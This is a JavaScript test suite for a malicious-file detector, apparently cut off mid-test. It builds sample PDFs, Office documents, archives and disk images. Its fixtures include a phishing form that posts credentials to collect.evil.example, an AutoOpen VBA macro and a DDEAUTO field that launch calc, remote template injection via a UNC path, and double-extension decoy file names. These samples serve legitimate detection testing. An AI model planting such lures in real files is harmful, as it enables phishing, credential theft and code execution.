import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { test } from 'node:test';
import { crc32, deflateRawSync, deflateSync, gzipSync } from 'node:zlib';
import { PassThrough } from 'node:stream';
import { createEmitter } from '../lib/emitter.mjs';
import { FILE_LIMITS, FINDING_IDS, analyzeFile, isDoubleExtension, ovbaDecompress } from '../lib/file.mjs';

// ---- fixtures, built here so that every byte is visible --------------------------------------------------------------

const analyze = (name, data, mime = 'application/octet-stream') => analyzeFile({ name, mime, data: Buffer.isBuffer(data) ? data : Buffer.from(data, 'latin1') });
const ids = (r) => r.findings.map((f) => f.id);
const detail = (r, id) => r.findings.find((f) => f.id === id)?.detail;
const hasFinding = (r, id) => assert.ok(ids(r).includes(id), `expected ${id} in ${JSON.stringify(r.findings)}`);
const noFinding = (r, id) => assert.ok(!ids(r).includes(id), `unexpected ${id} in ${JSON.stringify(r.findings)}`);

/** A ZIP with a central directory (unless central: false). `usize` may claim another size than the real one. */
function zip(entries, { central = true } = {}) {
  const locals = [];
  const cds = [];
  let off = 0;
  for (const e of entries) {
    const name = Buffer.from(e.name, 'utf8');
    const raw = Buffer.isBuffer(e.data) ? e.data : Buffer.from(e.data ?? '', 'utf8');
    const method = e.method ?? 8;
    const body = e.body ?? (method === 8 ? deflateRawSync(raw) : raw);
    const flags = e.flags ?? 0x800;
    const usize = e.usize ?? raw.length;
    const lh = Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50, 0);
    lh.writeUInt16LE(20, 4);
    lh.writeUInt16LE(flags, 6);
    lh.writeUInt16LE(method, 8);
    lh.writeUInt32LE(crc32(raw), 14);
    lh.writeUInt32LE(body.length, 18);
    lh.writeUInt32LE(usize, 22);
    lh.writeUInt16LE(name.length, 26);
    locals.push(lh, name, body);
    const ch = Buffer.alloc(46);
    ch.writeUInt32LE(0x02014b50, 0);
    ch.writeUInt16LE(20, 4);
    ch.writeUInt16LE(20, 6);
    ch.writeUInt16LE(flags, 8);
    ch.writeUInt16LE(method, 10);
    ch.writeUInt32LE(crc32(raw), 16);
    ch.writeUInt32LE(body.length, 20);
    ch.writeUInt32LE(usize, 24);
    ch.writeUInt16LE(name.length, 28);
    ch.writeUInt32LE(off, 42);
    cds.push(ch, name);
    off += 30 + name.length + body.length;
  }
  const cd = Buffer.concat(cds);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(entries.length, 8);
  eocd.writeUInt16LE(entries.length, 10);
  eocd.writeUInt32LE(cd.length, 12);
  eocd.writeUInt32LE(off, 16);
  return Buffer.concat([...locals, ...(central ? [cd, eocd] : [])]);
}

const CONTENT_TYPES = { name: '[Content_Types].xml', data: '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>' };
const REL = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships';
const rels = (...items) => `<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${items.join('')}</Relationships>`;
const docx = (...parts) => zip([CONTENT_TYPES, { name: '_rels/.rels', data: rels(`<Relationship Id="rId1" Type="${REL}/officeDocument" Target="word/document.xml"/>`) }, ...parts]);
const wordDoc = (body) => ({ name: 'word/document.xml', data: `<?xml version="1.0"?><w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>${body}</w:body></w:document>` });

/** A VBA source container in MS-OVBA compression with only literal tokens: a flag byte of 0 before every 8 bytes. */
function ovbaLiteral(text) {
  const src = Buffer.from(text, 'latin1');
  assert.ok(src.length <= 4096);
  const body = [];
  for (let i = 0; i < src.length; i += 8) body.push(0, ...src.subarray(i, i + 8));
  const header = 0xb000 | (body.length + 2 - 3);
  return Buffer.from([1, header & 0xff, header >> 8, ...body]);
}
const VBA_SOURCE = 'Attribute VB_Name = "Module1"\r\nSub AutoOpen()\r\n  Shell "calc"\r\nEnd Sub\r\n';

/** A compound file: the magic, an empty header and one directory sector with the given entry names. */
function ole(names, tail = Buffer.alloc(0)) {
  const head = Buffer.alloc(512);
  Buffer.from('d0cf11e0a1b11ae1', 'hex').copy(head);
  const dir = Buffer.alloc(128 * Math.max(4, names.length));
  names.forEach((n, i) => {
    const b = Buffer.from(n + '\0', 'utf16le');
    b.copy(dir, i * 128);
    dir.writeUInt16LE(b.length, i * 128 + 64);
  });
  return Buffer.concat([head, dir, tail]);
}

function pdf(...objects) {
  return Buffer.concat([Buffer.from('%PDF-1.7\n%\xe2\xe3\xcf\xd3\n', 'latin1'), ...objects.map((o) => (Buffer.isBuffer(o) ? o : Buffer.from(o, 'latin1'))), Buffer.from('\ntrailer << /Root 1 0 R >>\n%%EOF\n', 'latin1')]);
}
const flateObject = (num, content, extra = '') => {
  const data = deflateSync(Buffer.from(content, 'latin1'));
  return Buffer.concat([Buffer.from(`${num} 0 obj\n<< /Type /ObjStm /Length ${data.length} /Filter /FlateDecode${extra} >>\nstream\r\n`, 'latin1'), data, Buffer.from('\r\nendstream\nendobj\n', 'latin1')]);
};

function pe({ dll = false, plus = false } = {}) {
  const b = Buffer.alloc(0x200);
  b.write('MZ', 0, 'latin1');
  b.writeUInt32LE(0x80, 0x3c);
  b.write('PE\0\0', 0x80, 'latin1');
  b.writeUInt16LE(dll ? 0x2102 : 0x0102, 0x80 + 22);
  b.writeUInt16LE(plus ? 0x20b : 0x10b, 0x80 + 24);
  return b;
}

function lnk(relPath, args) {
  const h = Buffer.alloc(0x4c);
  Buffer.from('4c0000000114020000000000c000000000000046', 'hex').copy(h);
  h.writeUInt32LE(0x08 | 0x20 | 0x80, 0x14);
  const str = (s) => {
    const n = Buffer.alloc(2);
    n.writeUInt16LE(s.length);
    return Buffer.concat([n, Buffer.from(s, 'utf16le')]);
  };
  return Buffer.concat([h, str(relPath), str(args)]);
}

/** An ISO 9660 image whose root directory holds the given names (a name ending in "/" is a directory). */
function iso(names, { joliet = false } = {}) {
  const b = Buffer.alloc(22 * 2048);
  const pvd = 16 * 2048;
  b[pvd] = 1;
  b.write('CD001', pvd + 1, 'latin1');
  b[pvd + 156] = 34;
  b.writeUInt32LE(20, pvd + 156 + 2);
  b.writeUInt32LE(2048, pvd + 156 + 10);
  // with Joliet, a supplementary descriptor points at a second root whose names are UTF-16BE
  const svd = 17 * 2048;
  if (joliet) {
    b[svd] = 2;
    b.write('CD001', svd + 1, 'latin1');
    b.write('%/E', svd + 88, 'latin1');
    b[svd + 156] = 34;
    b.writeUInt32LE(21, svd + 156 + 2);
    b.writeUInt32LE(2048, svd + 156 + 10);
  }
  b[18 * 2048] = 255;
  b.write('CD001', 18 * 2048 + 1, 'latin1');
  let p = (joliet ? 21 : 20) * 2048;
  const encode = (s) => (joliet ? Buffer.from(s, 'utf16le').swap16() : Buffer.from(s, 'latin1'));
  for (const raw of [Buffer.from([0]), Buffer.from([1]), ...names.map((n) => encode(n.endsWith('/') ? n.slice(0, -1) : `${n};1`))]) {
    const len = 33 + raw.length + (raw.length % 2 === 0 ? 1 : 0);
    b[p] = len;
    b[p + 32] = raw.length;
    raw.copy(b, p + 33);
    if (names.some((n) => n.endsWith('/') && encode(n.slice(0, -1)).equals(raw))) b[p + 25] = 2;
    p += len;
  }
  return b;
}

function rar4(files, { encryptedHeaders = false } = {}) {
  const parts = [Buffer.from('Rar!\x1a\x07\x00', 'latin1')];
  const main = Buffer.alloc(13);
  main[2] = 0x73;
  main.writeUInt16LE(encryptedHeaders ? 0x80 : 0, 3);
  main.writeUInt16LE(13, 5);
  parts.push(main);
  for (const f of files) {
    const name = Buffer.from(f.name, 'latin1');
    const data = Buffer.from(f.data ?? 'x');
    const h = Buffer.alloc(32);
    h[2] = 0x74;
    h.writeUInt16LE(0x8000 | (f.encrypted ? 0x04 : 0), 3);
    h.writeUInt16LE(32 + name.length, 5);
    h.writeUInt32LE(data.length, 7);
    h.writeUInt32LE(data.length, 11);
    h.writeUInt16LE(name.length, 26);
    parts.push(h, name, data);
  }
  const end = Buffer.alloc(7);
  end[2] = 0x7b;
  end.writeUInt16LE(7, 5);
  parts.push(end);
  return Buffer.concat(parts);
}

const vintOf = (n) => {
  const out = [];
  do {
    out.push((n & 0x7f) | (n > 0x7f ? 0x80 : 0));
    n = Math.floor(n / 128);
  } while (n > 0);
  return Buffer.from(out);
};
function rar5Block(type, fields, { extra = Buffer.alloc(0), data = Buffer.alloc(0) } = {}) {
  const hflags = (extra.length ? 1 : 0) | (data.length ? 2 : 0);
  const head = Buffer.concat([vintOf(type), vintOf(hflags), extra.length ? vintOf(extra.length) : Buffer.alloc(0), data.length ? vintOf(data.length) : Buffer.alloc(0), fields, extra]);
  return Buffer.concat([Buffer.alloc(4), vintOf(head.length), head, data]);
}
function rar5(files, { encryptedHeaders = false } = {}) {
  const parts = [Buffer.from('Rar!\x1a\x07\x01\x00', 'latin1')];
  if (encryptedHeaders) return Buffer.concat([...parts, rar5Block(4, Buffer.from([0, 0, 0]))]);
  parts.push(rar5Block(1, vintOf(0)));
  for (const f of files) {
    const name = Buffer.from(f.name, 'utf8');
    const data = Buffer.from(f.data ?? 'x');
    const fields = Buffer.concat([vintOf(0), vintOf(data.length), vintOf(0), vintOf(0), vintOf(0), vintOf(name.length), name]);
    const extra = f.encrypted ? Buffer.concat([vintOf(3), vintOf(1), Buffer.from([0, 0])]) : Buffer.alloc(0);
    parts.push(rar5Block(2, fields, { extra, data }));
  }
  parts.push(rar5Block(5, vintOf(0)));
  return Buffer.concat(parts);
}

function gzipNamed(name, data) {
  const raw = Buffer.from(data);
  const h = Buffer.from([0x1f, 0x8b, 8, 8, 0, 0, 0, 0, 0, 3]);
  const tail = Buffer.alloc(8);
  tail.writeUInt32LE(crc32(raw), 0);
  tail.writeUInt32LE(raw.length, 4);
  return Buffer.concat([h, Buffer.from(name + '\0', 'latin1'), deflateRawSync(raw), tail]);
}

/** A ustar archive; a name over 100 bytes goes first into a GNU long-name entry, as GNU tar writes it. */
function tar(names) {
  const blocks = [];
  const header = (name, size, type) => {
    const h = Buffer.alloc(512);
    h.write(name.slice(0, 100), 0, 'utf8');
    h.write(size.toString(8).padStart(11, '0') + '\0', 124, 'latin1');
    h[156] = type;
    h.write('ustar\x0000', 257, 'latin1');
    return h;
  };
  for (const n of names) {
    if (n.length > 100) {
      const data = Buffer.alloc(Math.ceil((n.length + 1) / 512) * 512);
      data.write(n, 0, 'utf8');
      blocks.push(header('././@LongLink', n.length + 1, 0x4c), data);
    }
    blocks.push(header(n, 1, 0x30), Buffer.alloc(512, 0x41));
  }
  return Buffer.concat([...blocks, Buffer.alloc(1024)]);
}

function sevenZip(header) {
  const b = Buffer.alloc(32);
  b.write('7z\xbc\xaf\x27\x1c', 0, 'latin1');
  b.writeBigUInt64LE(16n, 12);
  b.writeBigUInt64LE(BigInt(header.length), 20);
  return Buffer.concat([b, Buffer.alloc(16), header]);
}

const PHISH_HTML = `<!doctype html><html><head><title>Sign in &amp; verify</title></head><body>
<form method="post" action="https://collect.evil.example/p.php"><input name="u"><INPUT TYPE=password name="p"><button>Go</button></form>
<form action="/local"><input name="q"></form>
<a href="https://login.microsoftonline.com.evil.example/">help</a><img src="https://cdn.evil.example/logo.png">
</body></html>`;
const LONG_B64 = Buffer.alloc(400, 'payload').toString('base64');

// ---- general -------------------------------------------------------------------------------------------------------

test('the event has the base fields: name, declared mime, size, SHA-256', () => {
  const data = Buffer.from([0, 1, 2, 3, 0xfe, 0xff, 9, 9]);
  const r = analyzeFile({ name: 'report.bin', mime: 'application/octet-stream', data });
  assert.deepEqual(
    { ...r, findings: undefined },
    { filename: 'report.bin', mime: 'application/octet-stream', bytes: data.length, sha256: createHash('sha256').update(data).digest('hex'), file_type: 'other', ext_mismatch: false, double_extension: false, findings: undefined, links: [], truncated: false },
  );
  assert.deepEqual(r.findings, []);
});

test('every field survives the event envelope (which owns type, kind, v and t)', async () => {
  const out = new PassThrough();
  let line = '';
  out.on('data', (d) => { line += d; });
  const emitter = createEmitter(out);
  const r = analyze('login.html', PHISH_HTML);
  await emitter.emit('file', r);
  const ev = JSON.parse(line);
  assert.equal(ev.type, 'evidence');
  assert.equal(ev.kind, 'file');
  for (const [k, v] of Object.entries(r)) assert.deepEqual(ev[k], v, k);
  assert.equal(ev.file_type, 'html');
});

test('the finding ids form the fixed set', () => {
  assert.equal(FINDING_IDS.length, new Set(FINDING_IDS).size);
  assert.equal(FINDING_IDS.length, 24);
});

test('the type comes from the content, not from the name', () => {
  const cases = [
    ['a.bin', pdf(''), 'pdf'], ['a.bin', zip([{ name: 'x.txt', data: 'x' }]), 'zip'], ['a.bin', docx(), 'ooxml'],
    ['a.bin', zip([{ name: 'mimetype', data: 'application/vnd.oasis.opendocument.text', method: 0 }, { name: 'content.xml', data: '<x/>' }]), 'odf'],
    ['a.bin', ole([]), 'ole'], ['a.bin', rar4([]), 'rar'], ['a.bin', rar5([]), 'rar'], ['a.bin', sevenZip(Buffer.from([1])), '7z'],
    ['a.bin', gzipSync('hello'), 'gzip'], ['a.txt', pe(), 'pe'], ['a', Buffer.from('\x7fELF\x02\x01\x01\0', 'latin1'), 'elf'],
    ['a', Buffer.from('cffaedfe07000001', 'hex'), 'macho'], ['a', Buffer.from('cafebabe00000002', 'hex'), 'macho'], ['a.class', Buffer.from('cafebabe00000034', 'hex'), 'other'],
    ['a', lnk('x', ''), 'lnk'], ['a', iso([]), 'iso'], ['a', Buffer.concat([Buffer.from('conectix'), Buffer.alloc(600)]), 'iso'],
    ['a', Buffer.concat([Buffer.from('vhdxfile'), Buffer.alloc(100)]), 'iso'], ['a', Buffer.concat([Buffer.alloc(100), Buffer.from('koly'), Buffer.alloc(508)]), 'iso'],
    ['a', Buffer.from('89504e470d0a1a0a', 'hex'), 'image'], ['a', Buffer.from('ffd8ffe0', 'hex'), 'image'], ['a', 'GIF89a', 'image'],
    ['a', 'RIFF\0\0\0\0WEBPVP8 ', 'image'], ['a', 'BM\0\0', 'image'], ['a', Buffer.from('00000100', 'hex'), 'image'],
    ['a.txt', PHISH_HTML, 'html'], ['a', '<?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg"></svg>', 'svg'],
    ['a', '<html><body><svg></svg></body></html>', 'html'], ['a', '\n\n<form action=x>', 'html'],
    ['run.ps1', 'Write-Host hi', 'script'], ['run', '#!/bin/sh\necho hi', 'script'], ['notes', 'just words', 'text'],
    ['a', '{\\rtf1 hello}', 'text'], ['a', Buffer.from([1, 2, 3, 0, 5]), 'other'], ['a', '', 'other'],
    ['a.html', Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from('<html><body>hi</body></html>', 'utf16le')]), 'html'],
    ['a.html', Buffer.concat([Buffer.from([0xfe, 0xff]), Buffer.from('<html><body>hi</body></html>', 'utf16le').swap16()]), 'html'],
    ['a.js', Buffer.from([0x4d, 0x5a, 0, 0]), 'pe'],
  ];
  for (const [name, data, type] of cases) assert.equal(analyze(name, data).file_type, type, `${name}: ${String(data).slice(0, 30)}`);
});

test('ext_mismatch: the name claims another type than the content', () => {
  assert.equal(analyze('invoice.pdf', pe()).ext_mismatch, true);
  assert.equal(analyze('invoice.docx', zip([{ name: 'a.exe', data: 'MZ' }])).ext_mismatch, true);
  assert.equal(analyze('invoice.txt', PHISH_HTML).ext_mismatch, true);
  assert.equal(analyze('scan.jpg', pe()).ext_mismatch, true);
  assert.equal(analyze('run.js', Buffer.from([1, 2, 0, 3])).ext_mismatch, true);
  // the same claim with the matching content, or no claim at all
  assert.equal(analyze('invoice.pdf', pdf('')).ext_mismatch, false);
  assert.equal(analyze('invoice.docx', docx()).ext_mismatch, false);
  assert.equal(analyze('bundle.zip', docx()).ext_mismatch, false);
  assert.equal(analyze('setup.exe', pe()).ext_mismatch, false);
  assert.equal(analyze('page.html', PHISH_HTML).ext_mismatch, false);
  assert.equal(analyze('photo.jpeg', Buffer.from('ffd8ffe0', 'hex')).ext_mismatch, false);
  assert.equal(analyze('report.bin', pe()).ext_mismatch, false);
  assert.equal(analyze('empty.pdf', '').ext_mismatch, false);
  // Windows drops trailing dots and spaces: "invoice.pdf. " is a pdf name
  assert.equal(analyze('invoice.pdf. ', pe()).ext_mismatch, true);
});

test('double_extension: a decoy extension in front of an executable one', () => {
  for (const n of ['invoice.pdf.exe', 'photo.jpg   .scr', 'Scan.PDF.js', 'report.docx_.hta', 'a.xlsx\u00a0.lnk', 'invoice.pdf.exe  ', 'doc.txt.bat', 'pay\u202efdp.exe'])
    assert.equal(isDoubleExtension(n), true, n);
  for (const n of ['invoice.pdf', 'setup.exe', 'my.report.final.pdf', 'archive.tar.gz', 'v1.2.exe', 'x.exe.pdf', 'notes.old.exe', 'scan.pdf.txt', ''])
    assert.equal(isDoubleExtension(n), false, n);
  assert.equal(analyze('invoice.pdf.exe', pe()).double_extension, true);
  assert.equal(analyze('invoice.exe', pe()).double_extension, false);
});

// ---- pdf -----------------------------------------------------------------------------------------------------------

test('pdf: each action keyword gives its finding', () => {
  const cases = [
    ['/JavaScript', 'pdf_javascript'], ['/JS', 'pdf_javascript'], ['/OpenAction', 'pdf_open_action'], ['/AA', 'pdf_open_action'],
    ['/Launch', 'pdf_launch'], ['/EmbeddedFile', 'pdf_embedded_file'], ['/EmbeddedFiles', 'pdf_embedded_file'],
    ['/SubmitForm', 'pdf_submit_form'], ['/Encrypt', 'pdf_encrypted'],
  ];
  for (const [kw, id] of cases) {
    const r = analyze('a.pdf', pdf(`1 0 obj << /Type /Catalog ${kw} 2 0 R >> endobj\n`));
    assert.deepEqual(ids(r), [id], kw);
    assert.equal(detail(r, id), '');
  }
  const clean = analyze('a.pdf', pdf('1 0 obj << /Type /Catalog /Pages 2 0 R /JSX 1 /AAA 2 >> endobj\n'));
  assert.deepEqual(clean.findings, []);
});

test('pdf: names hidden with #xx escapes are decoded', () => {
  const r = analyze('a.pdf', pdf('1 0 obj << /OpenAction << /S /J#61va#53cript /J#53 (app.alert(1)) >> >> endobj\n'));
  hasFinding(r, 'pdf_javascript');
});

test('pdf: /URI links, literal and hex strings with escapes', () => {
  const r = analyze('a.pdf', pdf(
    '1 0 obj << /S /URI /URI (https://evil.example/a\\(1\\)) >> endobj\n',
    '2 0 obj << /URI <68747470733a2f2f6865782e6578616d706c652f78> >> endobj\n',
    '3 0 obj << /URI (http://oct\\056example/y\\\n) >> endobj\n',
    '4 0 obj << /URI (mailto:a@b.example) /URI (https://evil.example/a\\(1\\)) >> endobj\n',
  ));
  assert.deepEqual(r.links, ['https://evil.example/a(1', 'https://hex.example/x', 'http://oct.example/y']);
  const u16 = Buffer.concat([Buffer.from('1 0 obj << /URI <feff', 'latin1'), Buffer.from(Buffer.from('https://wide.example/', 'utf16le').swap16().toString('hex')), Buffer.from('> >> endobj\n')]);
  assert.deepEqual(analyze('a.pdf', pdf(u16)).links, ['https://wide.example/']);
});

test('pdf: a FlateDecode stream is inflated and searched for actions and /URI', () => {
  const hidden = '5 0 obj << /S /JavaScript /JS (this.exportDataObject()) >> endobj 6 0 obj << /URI (https://hidden.example/x) >> endobj';
  const r = analyze('a.pdf', pdf('1 0 obj << /Type /Catalog >> endobj\n', flateObject(2, hidden)));
  assert.deepEqual(r.links, ['https://hidden.example/x']);
  assert.equal(detail(r, 'pdf_javascript'), 'compressed');
  // the same stream without the filter is not inflated: the compressed bytes hold nothing readable
  const raw = flateObject(2, hidden).toString('latin1').replace(' /Filter /FlateDecode', ' /Filter /Other');
  assert.deepEqual(analyze('a.pdf', pdf(Buffer.from(raw, 'latin1'))).links, []);
  // the filter name may be escaped too
  const escaped = flateObject(2, hidden).toString('latin1').replace('/FlateDecode', '/Fl#61teDecode');
  assert.deepEqual(analyze('a.pdf', pdf(Buffer.from(escaped, 'latin1'))).links, ['https://hidden.example/x']);
});

test('pdf: every stream is inflated, not only the first', () => {
  const r = analyze('a.pdf', pdf(flateObject(2, '/Type /Other'), flateObject(3, '/URI (https://second.example/)')));
  assert.deepEqual(r.links, ['https://second.example/']);
});

test('pdf: a stream with a bare LF after "stream" counts; "endstream" is not a stream start', () => {
  const data = deflateSync(Buffer.from('/URI (https://lf.example/)'));
  const obj = Buffer.concat([Buffer.from('2 0 obj << /Filter /FlateDecode >>\nstream\n'), data, Buffer.from('\nendstream\nendobj\n')]);
  assert.deepEqual(analyze('a.pdf', pdf(obj)).links, ['https://lf.example/']);
});

test('pdf: truncated and corrupt files still give what was read', () => {
  const noise = Array.from({ length: 100 }, (_, i) => createHash('sha512').update(String(i)).digest('hex')).join('');
  const whole = pdf('1 0 obj << /OpenAction 2 0 R >> endobj\n', flateObject(2, `/URI (https://early.example/) ${noise}`));
  const cut = whole.subarray(0, whole.indexOf('stream\r\n') + 8 + 300);
  assert.ok(!cut.includes('endstream'));
  const r = analyze('a.pdf', cut);
  assert.equal(r.file_type, 'pdf');
  hasFinding(r, 'pdf_open_action');
  assert.deepEqual(r.links, ['https://early.example/']);
  const garbage = Buffer.concat([Buffer.from('%PDF-1.4\n1 0 obj << /Filter /FlateDecode >>\nstream\r\n'), Buffer.alloc(1000, 0xab)]);
  assert.equal(analyze('a.pdf', garbage).file_type, 'pdf');
});

test('pdf: a deflate bomb in a stream is cut at the inflate cap', () => {
  const bomb = deflateSync(Buffer.alloc(FILE_LIMITS.entryInflateBytes + 1024));
  const obj = Buffer.concat([Buffer.from('2 0 obj << /Filter /FlateDecode >>\nstream\r\n'), bomb, Buffer.from('\r\nendstream\nendobj\n')]);
  const r = analyze('a.pdf', pdf(obj));
  assert.equal(r.truncated, true);
});

// ---- office --------------------------------------------------------------------------------------------------------

test('ooxml: vbaProject.bin is macros; an auto-run name in plain text is auto_exec', () => {
  const r = analyze('a.docm', docx({ name: 'word/vbaProject.bin', data: Buffer.concat([ole(['Root Entry', 'VBA']), Buffer.from('\0\0Document_Open\0\0')]) }));
  assert.equal(r.file_type, 'ooxml');
  assert.equal(detail(r, 'macros'), 'word/vbaProject.bin');
  assert.equal(detail(r, 'auto_exec'), 'Document_Open');
});

test('ooxml: an auto-run name only in the compressed VBA source is found by decompressing it', () => {
  const container = ovbaLiteral(VBA_SOURCE);
  assert.ok(!container.toString('latin1').includes('AutoOpen'), 'the fixture must split the name with a flag byte');
  const r = analyze('a.xlsm', docx({ name: 'xl/vbaProject.bin', data: Buffer.concat([Buffer.alloc(300, 7), container, Buffer.alloc(50)]) }));
  assert.equal(detail(r, 'auto_exec'), 'AutoOpen');
  const noAuto = analyze('a.xlsm', docx({ name: 'xl/vbaProject.bin', data: ovbaLiteral('Attribute VB_Name = "M"\r\nSub Helper()\r\nEnd Sub\r\n') }));
  hasFinding(noAuto, 'macros');
  noFinding(noAuto, 'auto_exec');
});

test('ooxml: a name that only contains an auto-run name is not one', () => {
  for (const data of ['MyAutoOpenHelper Document_Opener', 'MyAutoOpen() x', 'Document_OpenX'])
    noFinding(analyze('a.docm', docx({ name: 'word/vbaProject.bin', data })), 'auto_exec');
});

test('ovbaDecompress follows MS-OVBA: literal and copy tokens', () => {
  const hex = (s) => Buffer.from(s.replace(/ /g, ''), 'hex');
  assert.equal(ovbaDecompress(hex('01 19 B0 00 61 62 63 64 65 66 67 68 00 69 6A 6B 6C 6D 6E 6F 70 00 71 72 73 74 75 76 2E'), 0), 'abcdefghijklmnopqrstuv.');
  assert.equal(ovbaDecompress(hex('01 05 B0 08 61 62 63 03 20'), 0), 'abcabcabc');
  // a run long enough for the copy token to use 5 offset bits
  assert.equal(ovbaDecompress(hex('01 2F B0 00 23 61 61 61 62 63 64 65 82 66 00 70 61 67 68 69 6A 01 38 08 61 6B 6C 00 30 6D 6E 6F 70 06 71 02 70 04 10 72 73 74 75 76 10 77 78 79 7A 00 3C'), 0),
    '#aaabcdefaaaaghijaaaaaklaaamnopqaaaaaaaaaaaarstuvwxyzaaa');
  assert.equal(ovbaDecompress(ovbaLiteral(VBA_SOURCE), 0), VBA_SOURCE);
  // broken input stops, it does not throw or read outside
  assert.equal(ovbaDecompress(hex('01 05 B0 01 FF FF'), 0), '');
  assert.equal(ovbaDecompress(hex('02 05 B0'), 0), '');
});

test('ooxml: Excel 4.0 macro sheets are macros', () => {
  hasFinding(analyze('a.xlsm', docx({ name: 'xl/macrosheets/sheet1.xml', data: '<xm:macrosheet/>' })), 'macros');
});

test('ooxml: an external template relation is remote template injection; its host is the detail', () => {
  const settings = { name: 'word/_rels/settings.xml.rels', data: rels(`<Relationship Id="rId9" Type="${REL}/attachedTemplate" Target="https://tpl.evil.example/t.dotm" TargetMode="External"/>`) };
  const r = analyze('a.docx', docx(settings));
  assert.equal(detail(r, 'external_template'), 'tpl.evil.example');
  assert.deepEqual(r.links, ['https://tpl.evil.example/t.dotm']);
  for (const type of ['oleObject', 'frame', 'subDocument']) {
    const x = analyze('a.docx', docx({ name: 'word/_rels/document.xml.rels', data: rels(`<Relationship Id="r" Type="${REL}/${type}" Target="http://h-${type}.example/x" TargetMode="External"/>`) }));
    assert.equal(detail(x, 'external_template'), `h-${type.toLowerCase()}.example`, type);
  }
  // a UNC path leaks credentials the same way: its host is the detail
  const unc = analyze('a.docx', docx({ name: 'word/_rels/settings.xml.rels', data: rels(`<Relationship Id="r" Type="${REL}/attachedTemplate" Target="\\\\smb.evil.example\\share\\t.dotm" TargetMode="External"/>`) }));
  assert.equal(detail(unc, 'external_template'), 'smb.evil.example');
  // an internal template or an external hyperlink is not template injection
  const benign = analyze('a.docx', docx({ name: 'word/_rels/document.xml.rels', data: rels(
    `<Relationship Id="r1" Type="${REL}/attachedTemplate" Target="file:///C:/t.dotm"/>`,
    `<Relationship Id="r2" Type="${REL}/hyperlink" Target="https://news.example/a?b=1&amp;c=2" TargetMode="External"/>`) }));
  noFinding(benign, 'external_template');
  assert.deepEqual(benign.links, ['https://news.example/a?b=1&c=2']);
});

test('ooxml: embedded OLE objects', () => {
  assert.equal(detail(analyze('a.docx', docx({ name: 'word/embeddings/oleObject1.bin', data: ole([]) })), 'ole_object'), 'word/embeddings/oleObject1.bin');
  assert.equal(detail(analyze('a.docx', docx({ name: 'ppt/objects/oleObject2.bin', data: 'x' })), 'ole_object'), 'ppt/objects/oleObject2.bin');
  assert.equal(detail(analyze('a.docx', docx({ name: 'word/embeddings/Package7.bin', data: 'x' })), 'ole_object'), 'word/embeddings/Package7.bin');
  const viaRel = analyze('a.docx', docx({ name: 'word/_rels/document.xml.rels', data: rels(`<Relationship Id="r" Type="${REL}/oleObject" Target="embeddings/obj.dat"/>`) }));
  assert.equal(detail(viaRel, 'ole_object'), 'embeddings/obj.dat');
  noFinding(analyze('a.docx', docx({ name: 'word/media/image1.png', data: 'x' })), 'ole_object');
});

test('ooxml: DDE field codes, also split across runs, and ddeLink in Excel', () => {
  const split = analyze('a.docx', docx(wordDoc('<w:r><w:instrText xml:space="preserve"> DDE</w:instrText></w:r><w:r><w:instrText>AUTO c:\\\\windows\\\\system32\\\\cmd.exe "/k calc"</w:instrText></w:r>')));
  assert.match(detail(split, 'dde'), /^DDEAUTO c:/);
  hasFinding(analyze('a.docx', docx(wordDoc('<w:fldSimple w:instr=" DDE &quot;c:\\cmd.exe&quot; x"/>'))), 'dde');
  hasFinding(analyze('a.docx', docx({ name: 'word/footer2.xml', data: '<w:instrText>DDEAUTO x</w:instrText>' })), 'dde');
  hasFinding(analyze('a.xlsx', docx({ name: 'xl/externalLinks/externalLink1.xml', data: '<externalLink><ddeLink ddeService="cmd"/></externalLink>' })), 'dde');
  const hyper = analyze('a.docx', docx(wordDoc('<w:instrText> HYPERLINK "https://field.example/p" </w:instrText><w:t>DDE is a word here</w:t>')));
  noFinding(hyper, 'dde');
  assert.deepEqual(hyper.links, ['https://field.example/p']);
});

test('odf: Basic macros, auto-run event, links', () => {
  const odt = zip([
    { name: 'mimetype', data: 'application/vnd.oasis.opendocument.text', method: 0 },
    { name: 'content.xml', data: '<office:document-content><office:event-listeners><script:event-listener script:language="ooo:script" script:event-name="office:load" xlink:href="vnd.sun.star.script:Standard.Module1.Main"/></office:event-listeners><text:a xlink:href="https://odf.example/x">x</text:a></office:document-content>' },
    { name: 'Basic/Standard/Module1.xml', data: '<script:module/>' },
  ]);
  const r = analyze('a.odt', odt);
  assert.equal(r.file_type, 'odf');
  assert.equal(detail(r, 'macros'), 'Basic/Standard/Module1.xml');
  assert.equal(detail(r, 'auto_exec'), 'office:load');
  assert.deepEqual(r.links, ['https://odf.example/x']);
  assert.equal(r.entries, undefined, 'a document is not listed as an archive');
});

test('ole: _VBA_PROJECT or a VBA storage is macros; auto-run names are looked for only then', () => {
  const doc = analyze('a.doc', ole(['Root Entry', 'Macros', '_VBA_PROJECT'], Buffer.from('xxAutoOpenxx Sub AutoOpen()')));
  assert.equal(detail(doc, 'macros'), '_VBA_PROJECT');
  assert.equal(detail(doc, 'auto_exec'), 'AutoOpen');
  assert.equal(detail(analyze('a.xls', ole(['Root Entry', 'VBA'], Buffer.from(' Workbook_Open '))), 'macros'), 'VBA');
  hasFinding(analyze('a.xls', ole(['Root Entry', 'VBA'], Buffer.from(' Workbook_Open '))), 'auto_exec');
  // "VBA" as text, not as a directory entry name, is not a macro storage
  const text = analyze('a.doc', Buffer.concat([ole(['Root Entry']), Buffer.alloc(1), Buffer.from('VBA\0', 'utf16le'), Buffer.from(' AutoOpen ')]));
  noFinding(text, 'macros');
  noFinding(text, 'auto_exec');
  // at an entry boundary but without the name length of a directory entry
  const aligned = Buffer.concat([ole(['Root Entry']), Buffer.from('VBA\0', 'utf16le'), Buffer.alloc(124)]);
  assert.equal(aligned.indexOf(Buffer.from('VBA\0', 'utf16le')) % 128, 0);
  noFinding(analyze('a.doc', aligned), 'macros');
  // with the name length but off the entry boundary
